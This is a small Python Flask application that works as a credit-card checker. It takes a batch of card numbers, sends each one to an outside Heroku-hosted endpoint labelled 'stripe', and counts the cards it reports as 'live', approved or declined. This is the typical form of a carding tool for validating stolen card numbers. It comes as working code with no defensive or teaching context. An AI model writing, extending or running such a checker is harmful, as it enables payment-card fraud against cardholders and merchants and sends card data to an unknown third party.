from flask import Flask, request, jsonify, render_template
import requests, time

app = Flask(__name__)

API = "https://lit-beach-04359-37fde60e4db4.herokuapp.com/stripe?cc={card}"

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/check", methods=["POST"])
def check():
    data = request.get_json()
    cards = data.get("cards", [])

    results = []
    live = approved = declined = 0

    for card in cards:
        card = card.strip()
        if not card:
            continue

        start = time.time()
        try:
            r = requests.get(API.format(card=card), timeout=15)
            j = r.json()
            elapsed = int((time.time() - start) * 1000)

            success = bool(j.get("success"))
            resp = j.get("Response", "NO RESPONSE")

            if success:
                live += 1
                approved += 1
            else:
                declined += 1

            results.append({
                "card": card,
                "success": success,
                "response": resp,
                "time": elapsed
            })

        except Exception:
            declined += 1
            results.append({
                "card": card,
                "success": False,
                "response": "ERROR",
                "time": 0
            })

    return jsonify({
        "live": live,
        "approved": approved,
        "declined": declined,
        "results": results
    })
